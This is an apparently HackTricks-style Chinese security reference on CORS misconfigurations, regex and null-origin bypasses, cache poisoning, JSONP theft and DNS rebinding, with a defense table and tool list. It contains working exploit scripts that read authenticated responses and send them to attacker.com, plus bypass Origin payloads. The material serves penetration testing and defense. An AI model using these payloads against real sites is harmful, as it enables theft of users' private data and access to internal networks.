---
attack_surface: [配置缺陷, 认证/授权绕过, 协议解析差异, 客户端利用]
impact: [信息泄露, 身份伪造, 机密性破坏]
risk_level: 高
prerequisites:
  - 浏览器同源策略 (SOP) 基础理解
  - HTTP 协议基础 (headers, CORS)
  - JavaScript 基础 (XMLHttpRequest / Fetch API)
related_techniques:
  - csrf-cross-site-request-forgery
  - xss-cross-site-scripting
  - xssi-cross-site-script-inclusion
  - dns-rebinding
  - cache-poisoning
  - cookies-hacking
difficulty: 中级
tools:
  - Burp Suite + CORS 插件
  - CORScanner / Corsy / CorsMe
  - Singularity of Origin (DNS Rebinding)
  - curl / browser DevTools
---

# CORS — 配置缺陷与绕过

## TL;DR

Cross-Origin Resource Sharing（CORS）的本质是**服务器授权浏览器突破同源策略**。配置错误的核心模式是：服务器信任了不该信任的 `Origin`（反射、null、正则绕过、子域名 XSS），或者攻击者通过 DNS Rebinding / JSONP / 浏览器 quirks 绕过了 Origin 校验。

**触发真正危害的关键条件**：`Access-Control-Allow-Credentials: true`。没有它，攻击者无法携带 Cookie/Authorization 读取响应，攻击价值骤降至与直接 curl 无异。

---

## 1. 背景与原理

### 1.1 同源策略（Same-Origin Policy）

同源策略要求请求方与被请求方共享**相同协议、域名、端口**。以下表说明 `http://normal-website.com/example/example.html` 对各 URL 的访问权限：

| URL | 访问权限 | 原因 |
|-----|:---:|------|
| `http://normal-website.com/example/` | ✓ | 相同协议、域名、端口 |
| `http://normal-website.com/example2/` | ✓ | 相同协议、域名、端口 |
| `https://normal-website.com/example/` | ✗ | 协议不同 (http vs https)、端口不同 |
| `http://en.normal-website.com/example/` | ✗ | 域名不同 |
| `http://www.normal-website.com/example/` | ✗ | 域名不同 |
| `http://normal-website.com:8080/example/` | ✗ | 端口不同 (IE 除外) |

> Internet Explorer 在强制同源策略时忽略端口号，因此允许上述最后一个访问。

### 1.2 CORS 的核心：Server 授权 Browser

CORS 不是安全机制——它是**服务端对同源策略的豁免授权**。浏览器自动在跨域请求中添加 `Origin` 头，服务端通过 `Access-Control-Allow-Origin`（ACAO）决定是否授权。**CORS 不保护 CSRF**——GET/POST 简单请求在大部分情况下直接发送，预检只是保护响应不被读取。

---

## 2. CORS 响应头参考

| Header | 方向 | 作用 |
|--------|------|------|
| `Access-Control-Allow-Origin` | 响应 | 允许读取响应的源（单一源或 `*`） |
| `Access-Control-Allow-Credentials` | 响应 | 是否允许携带凭据（Cookie、Authorization、TLS 客户端证书） |
| `Access-Control-Allow-Methods` | 响应 | 预检响应中声明的允许 HTTP 方法 |
| `Access-Control-Allow-Headers` | 响应 | 预检响应中声明的允许请求头 |
| `Access-Control-Expose-Headers` | 响应 | 允许客户端脚本读取的响应头（超出简单响应头范畴） |
| `Access-Control-Max-Age` | 响应 | 预检结果缓存时间（秒） |
| `Access-Control-Request-Method` | 请求 | 预检请求中声明即将使用的方法 |
| `Access-Control-Request-Headers` | 请求 | 预检请求中声明即将使用的自定义头 |
| `Origin` | 请求 | 浏览器自动设置，指示请求来源 |

### 2.1 凭据模式（Credentials）

默认情况下，跨域请求**不携带凭据**（Cookie、Authorization Header）。要让浏览器携带凭据并允许读取响应：

**客户端**必须显式声明：
```javascript
// XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", "https://api.example.com/data", true);
xhr.send(null);

// Fetch API
fetch("https://api.example.com/data", {
  credentials: "include"
});
```

**服务端**必须同时返回：
```
Access-Control-Allow-Origin: https://trusted.example.com
Access-Control-Allow-Credentials: true
```

> **关键限制**：`Access-Control-Allow-Origin: *` 与 `Access-Control-Allow-Credentials: true` **不可同时使用**——浏览器会拒绝此组合。

---

## 3. 预检请求（Pre-flight）

### 3.1 触发条件

当跨域请求满足以下**任一条件**时，浏览器先发 `OPTIONS` 预检：

- 使用非简单方法（非 GET/HEAD/POST）
- 设置非简单请求头（Accept、Accept-Language、Content-Language、Content-Type 以外）
- `Content-Type` 为非简单值（非 `application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`）
- 请求体中使用了 `ReadableStream`
- 在 `XMLHttpRequest` 上注册了事件监听器

### 3.2 预检流程

**请求**：
```http
OPTIONS /info HTTP/1.1
Host: example2.com
Origin: https://example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```

**响应**：
```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```

### 3.3 本地网络请求预检（Private Network Access）

当公共网站尝试访问私有/本地网络资源时，浏览器会发送额外预检：

```http
OPTIONS / HTTP/1.1
Host: router.local
Origin: https://example.com
Access-Control-Request-Method: GET
Access-Control-Request-Private-Network: true
```

服务端必须响应：
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Private-Network: true
```

> **Chrome PNA 状态（2024.10）**：Chrome 文档声明因兼容性问题**暂停了 PNA 预检强制执行**，但安全上下文限制仍然生效。实际测试中需同时验证"符合规范的预检流程"和"因执行不完整而仍然可用的旧行为"。

**已知绕过**：
- **`0.0.0.0` IP（Linux/Mac）**：不被视为"本地"地址，可绕过 PNA 限制访问 localhost（浏览器/版本依赖，Chrome 后续可能将其纳入 PNA）
- **公网 IP 访问本地端点**：如路由器的公网 IP——从本地网络访问时，即使使用公网 IP 也会被授予访问权限

---

## 4. 可利用的错误配置

### 4.1 Origin 反射（Reflection）

**最常见且最危险的错误配置**：服务端动态复制 `Origin` 请求头的值到 `Access-Control-Allow-Origin`。

```javascript
// 攻击者页面上的窃取脚本
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open("get", "https://victim.com/api/user/details", true);
req.withCredentials = true;
req.send();

function reqListener() {
  // 成功读取响应，外泄至攻击者服务器
  location = "https://attacker.com/log?key=" + encodeURIComponent(this.responseText);
}
```

**检测方法**：发送带有随机 Origin 的跨域请求，观察 ACAO 是否回显该值。

### 4.2 `null` Origin 利用

`null` origin 出现在重定向、本地 HTML 文件、sandboxed iframe 等场景。部分应用为方便本地开发将 `null` 列入白名单。

```html
<!-- 通过 sandboxed iframe 使浏览器的 Origin 变为 null -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.com/api/details',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://attacker.com/log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

`sandbox="allow-scripts"` 的 iframe 的 origin 为 `null`——如果服务器将 `null` 列入白名单，即可绕过 CORS。

### 4.3 正则绕过 —— 特殊字符

**原始研究**：[Advanced CORS Techniques (Corben Leo)](https://www.corben.io/advanced-cors-techniques/) 和 [Think Outside the Scope (Sandh0t)](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

正则验证通常只关注字母数字、点 (`.`) 和连字符 (`-`)，忽略了浏览器对特殊字符的宽容解析。

**Chrome/Firefox — 下划线绕过**：
```http
GET / HTTP/2
Cookie: <session_cookie>
Origin: https://victim.com_.attacker.com
```
→ 服务器正则匹配 `.victim.com`（认为子域名合法）→ 回显 `Access-Control-Allow-Origin: https://victim.com_.attacker.com` → 攻击者成功

**浏览器特殊字符兼容性矩阵**（决定哪些字符可嵌入域名绕过正则）：

| 字符 | Chrome | Edge | Firefox | IE | Safari |
|:---:|:---:|:---:|:---:|:---:|:---:|
| `!` `*` `'` `(` `)` `,` `;` `^` `` ` `` `{` `\|` `}` `~` | ✗ | ✗ | ✗ | ✗ | **✓** |
| `$` `+` | ✗ | ✗ | **✓** | ✗ | **✓** |
| `-` | **✓** | ✗ | **✓** | **✓** | **✓** |
| `_` | **✓** | **✓** | **✓** | **✓** | **✓** |
| `=` `&` | ✗ | ✗ | ✗ | ✗ | **✓** |

> Safari 是**最宽容的浏览器**——支持所有以上特殊字符。Chrome 和 IE 只允许 `-` 和 `_`。Firefox 额外允许 `$` 和 `+`。攻击者根据目标用户浏览器的差异选择可行的特殊字符。

**Safari — 更宽松的字符支持**：
```http
GET / HTTP/2
Cookie: <session_cookie>
Origin: https://victim.com}.attacker.com
```
Safari 允许域名字段中出现 `}` 字符，绕过正则过滤。

**高级 Safari 域名分割 Payload**（PortSwigger URL Validation Bypass Cheat Sheet）：
```
https://victim.com.{.attacker.com/
https://victim.com.}.attacker.com/
https://victim.com.`.attacker.com/
```

后端仅检查 origin 是否"以/包含"可信主机名，浏览器却将攻击者控制的后缀视为有效 origin 边界。

**现代 Origin Fuzzing 三大 Payload 家族**（PortSwigger Cheat Sheet）：
1. **Domain allow-list bypasses**：前缀/后缀/子串匹配欺骗
2. **Fake-relative absolute URLs**：浏览器认为有效的绝对 URL，应用层代码可能当作相对路径解析
3. **Loopback/IP normalizations**：当 CORS 逻辑仅用字符串比较阻止 `localhost`、`127.0.0.1` 或云元数据端点时的替代 IPv4/IPv6 形式

### 4.4 白名单子域名 XSS → CORS 绕过

开发者常将整个域名及其子域名加入 CORS 白名单：

```javascript
if ($_SERVER["HTTP_HOST"] == "*.requester.com") { /* 允许 */ }
```

**攻击链**：如果 `sub.requester.com` 存在 XSS 漏洞，攻击者可在该子域名上执行 JavaScript，从白名单内发起跨域请求，读取 `provider.com` 上的受保护资源——CORS 安全模型完全崩溃。

### 4.5 服务端缓存投毒（Server-Side Cache Poisoning）

**原始研究**：[Exploiting CORS Misconfigurations for Bitcoins and Bounties (PortSwigger)](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

利用 `Origin` 头注入 `0x0d`（CR — Internet Explorer/Edge 将其视为 HTTP header 终止符）：

```http
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```

IE/Edge 将响应解析为：
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```

攻击者通过 Burp Suite 手动构造请求，利用服务端缓存保存被污染的响应。后续访问者获取缓存的 UTF-7 页面，触发存储型 XSS。

### 4.6 客户端缓存投毒（Client-Side Cache Poisoning）

当应用反射自定义 HTTP 头内容（如 `X-User-id`）而未经编码时，可以通过 CORS 发送恶意头并将响应缓存在浏览器中：

```html
<script>
  function gotcha() { location = url; }
  var req = new XMLHttpRequest();
  url = "https://victim.com/reflect-headers";
  req.onload = gotcha;
  req.open("get", url, true);
  req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
  req.send();
</script>
```

**关键条件**：响应中**未设置 `Vary: Origin` 头**——浏览器将恶意响应缓存后，直接导航到该 URL 会使用缓存中的被污染版本。

---

## 5. 绕过技术

### 5.1 XSSI / JSONP 绕过

XSSI（Cross-Site Script Inclusion）利用了 `<script>` 标签**不受同源策略限制**的事实。JSONP（JSON with Padding）是最常见的可利用形式。

**检测**：请求中添加 `callback` 参数，如果服务端返回 `Content-Type: application/javascript` 且以 `callback_value(data)` 格式包裹数据，则 JSONP 可用。

```
GET /api/data?callback=testjsonp HTTP/1.1
Host: api.victim.com
```

```
HTTP/1.1 200 OK
Content-Type: application/javascript

testjsonp({"user":"admin","email":"admin@victim.com"})
```

**利用**：攻击者在自己的页面定义 `testjsonp` 函数，通过 `<script src="...">` 引入 JSONP 端点窃取数据。

```html
<script>
  function testjsonp(data) {
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  }
</script>
<script src="https://api.victim.com/api/data?callback=testjsonp"></script>
```

**BurpSuite 插件**：[jsonp](https://github.com/kapytein/jsonp) — 自动识别和检测 XSSI/JSONP 漏洞。

### 5.2 CORS 代理绕过（工具型）

这些工具通过服务端转发请求并修改 Origin 头，绕过 CORS 限制——**但凭据不会随请求发送**：

- [CORS-escape](https://github.com/shalvah/cors-escape)
- [simple-cors-escape](https://github.com/shalvah/simple-cors-escape)

### 5.3 Iframe + Popup 绕过

**场景**：绕过 `e.origin === window.origin` 类检查。

通过在攻击者页面创建 iframe 和 popup 窗口链，可利用 JavaScript 中的 origin 检查逻辑漏洞。详见：

> 交叉引用：[Iframes in XSS and CSP](https://github.com/hacktricks) — `xss-cross-site-scripting/iframes-in-xss-and-csp.md`

**关键 iframe 行为**：
- `srcdoc` 的文档与父页面**同源**（除非有 `sandbox` 无 `allow-same-origin`），注入到 `srcdoc` 的 HTML 通常等于获得对顶层的直接 DOM 访问
- `srcdoc` 中的相对 URL 以**嵌入页面的 URL 为基准**解析，并非 `about:srcdoc`

### 5.4 DNS Rebinding

DNS Rebinding 利用 DNS TTL 和浏览器缓存机制绕过同源策略——让浏览器相信攻击者控制的域名 IP 已变为目标内网 IP。

#### 5.4.1 TTL 方式（经典）

1. 攻击者创建网页，引诱受害者访问
2. DNS 响应返回攻击者 IP（TTL 短），攻击者页面加载恶意 JS
3. TTL 过期后，DNS 响应变为受害者内网 IP（如 `127.0.0.1` 或 `192.168.1.1`）
4. 浏览器视角：**同域**——SOP 允许 JS 读取"攻击者域名"上的资源，实际已被路由到内网

**快速测试服务**：[rebinder](https://lock.cmpxchg8b.com/rebinder.html)

**自建服务器**：[DNSrebinder](https://github.com/mogwailabs/DNSrebinder) — 暴露本地 53/udp 端口，创建 NS 记录指向自己

#### 5.4.2 DNS 缓存洪泛

使用 Service Worker 洪泛浏览器 DNS 缓存，迫使缓存中的攻击者域名记录被清除，第二次 DNS 请求被解析为 `127.0.0.1`。

#### 5.4.3 多 A 记录方式

在 DNS 提供商配置两条 A 记录：
1. 第一个 IP：攻击者服务器（先响应，提供 payload）
2. 第二个 IP：目标内网 IP（`0.0.0.0` Linux/Mac 或 `127.0.0.1` Windows）

浏览器使用第一个 IP → 攻击者 payload 开始轮询同域 → 攻击者停止响应 → 浏览器**自动切换到第二个 IP** → SOP 允许读取同域上（现在是内网服务）的数据。

> **注意**：GoDaddy/Cloudflare 不允许 `0.0.0.0` 作为 A 记录。**AWS Route53** 允许创建一条 A 记录包含两个 IP（其一为 `0.0.0.0`）。

#### 5.4.4 DNS-over-HTTPS (DoH) 下的 Rebinding

DoH 只是将 DNS 查询包装在 HTTPS 中——浏览器使用的 `Origin` 仍然相同，**SOP 破坏技术不因传输加密而失效**。

**关键发现**：
- **First-then-second** 策略最可靠：首次查询返回攻击者 IP 提供 payload，后续查询返回内部/localhost IP，~40-60 秒完成翻转
- **Multiple answers（快速 rebinding）**：<3 秒到达 localhost——同时返回两条 A 记录（攻击者 IP + `0.0.0.0`/`127.0.0.1`），页面加载后用 iptables 黑洞攻击者 IP
- **CNAME 绕过 DoH 过滤**：返回 CNAME 到仅内网存在的主机名，Firefox DoH 回退到系统 DNS 解析，完成内网 IP 的解析

**浏览器差异**：

| 浏览器 | DoH 行为 | 影响 |
|--------|---------|------|
| Firefox | 回退模式：DoH 失败后走 OS 解析器 | CNAME 绕过在内部网络中高度可靠 |
| Chrome | 仅当 OS DNS 指向白名单 DoH 解析器时激活 | 回退链更短，但 localhost/可路由地址 rebinding 仍然有效 |

**测试和监控**：
```bash
# 查询 DoH API 确认返回的记录
curl -H 'accept: application/dns-json' \
  'https://cloudflare-dns.com/dns-query?name=example.com&type=A' | jq

# 导出 TLS 密钥供 Wireshark 解密 DoH 流量
export SSLKEYLOGFILE=~/SSLKEYLOGFILE.txt
```

#### 5.4.5 其他常见绕过

- 内网 IP 被禁 → 尝试 `0.0.0.0`（Linux/Mac）
- DNS A 记录被禁止 → 用 **CNAME** 指向 localhost
- DNS A 记录被禁止 → 用 **CNAME** 指向内网主机名（如 `www.corporate.internal`）

### 5.5 综合武器化工具

**[Singularity of Origin](https://github.com/nccgroup/singularity)** — NCC Group 的全功能 DNS Rebinding 攻击框架，整合了上述所有 rebinding 策略，包括 DoH 支持、多种 payload 模板和攻击服务器管理。

---

## 6. 真实防御（非仅 CORS Headers）

| 层级 | 措施 | 保护范围 |
|------|------|---------|
| **原点校验** | 不要反射 `Origin` 值到 `ACAO`；使用静态白名单而非正则 | Origin 反射、正则绕过 |
| **凭据保护** | 非必要不使用 `Access-Control-Allow-Credentials: true` | 所有凭据携带类攻击 |
| **内网服务** | 启用 TLS + 要求认证 + 验证 `Host` 头 | DNS Rebinding |
| **PNA** | 遵守 [Private Network Access 规范](https://wicg.github.io/private-network-access/) | 公网→内网攻击 |
| **缓存** | 始终设置 `Vary: Origin`（防止缓存投毒） | 服务端/客户端缓存投毒 |
| **输入验证** | 对所有 HTTP 头进行严格校验，不允许 CR/LF 等非法字符 | 缓存投毒 |
| **子域名安全** | CORS 白名单中的子域名与主站同等安全要求 | 子域名 XSS → CORS 绕过 |
| **预检审计** | 监控异常的 `OPTIONS` 请求模式和 Origin 组合 | 所有 CORS 攻击 |

---

## 7. 攻击链建模

```
[Origin 反射/正则绕过] → [Credentials 模式读取] → [敏感数据外泄]
[子域名 XSS] → [CORS 白名单内请求] → [主站接口数据窃取]
[DNS Rebinding] → [SOP 绕过] → [内网服务访问] → [SSRF/LFI/RCE]
[CORS + 缓存投毒] → [存储型 XSS] → [会话劫持]
[JSONP endpoint] → [<script> 标签包含] → [跨域数据窃取]
```

---

## 8. 检测工具

**Burp Suite 插件**：
- [CORS Scanner](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
- [CORS Additional Checks](https://portswigger.net/bappstore/c257bcb0b6254a578535edb2dcee87d0)

**独立扫描器**：
- [CORScanner](https://github.com/chenjj/CORScanner) — Python 全功能 CORS 漏洞扫描器
- [Corsy](https://github.com/s0md3v/Corsy) — 轻量级 CORS 错误配置扫描器
- [CorsMe](https://github.com/Shivangx01b/CorsMe) — 多维度 CORS 检测
- [CorsOne](https://github.com/omranisecurity/CorsOne) — 自动化 CORS 渗透测试
- [theftfuzzer](https://github.com/lc/theftfuzzer) — 跨域数据窃取 PoC 生成器

---

## 参考资料

### 核心研究
- [PortSwigger: Exploiting CORS Misconfigurations for Bitcoins and Bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
- [Advanced CORS Techniques (Corben Leo)](https://www.corben.io/advanced-cors-techniques/)
- [Think Outside the Scope — Advanced CORS Exploitation Techniques (Sandh0t)](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
- [PortSwigger: New Crazy Payloads in the URL Validation Bypass Cheat Sheet](https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet)

### DNS Rebinding
- [NCC Group: Singularity of Origin](https://github.com/nccgroup/singularity)
- [Gerald Doussot — State of DNS Rebinding Attacks (DEF CON 27)](https://www.youtube.com/watch?v=y9-0lICNjOQ)
- [NCC Group: Impact of DNS over HTTPS on DNS Rebinding Attacks](https://www.nccgroup.com/research-blog/impact-of-dns-over-https-doh-on-dns-rebinding-attacks/)
- [Unit42: DNS Rebinding](https://unit42.paloaltonetworks.com/dns-rebinding/)

### 参考与工具
- [PortSwigger Web Security Academy: CORS](https://portswigger.net/web-security/cors)
- [MDN: CORS Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
- [PayloadsAllTheThings: CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
- [Chrome: Private Network Access on Hold (2024.10)](https://developer.chrome.com/blog/pna-on-hold)
- [Private Network Access 规范](https://wicg.github.io/private-network-access/)
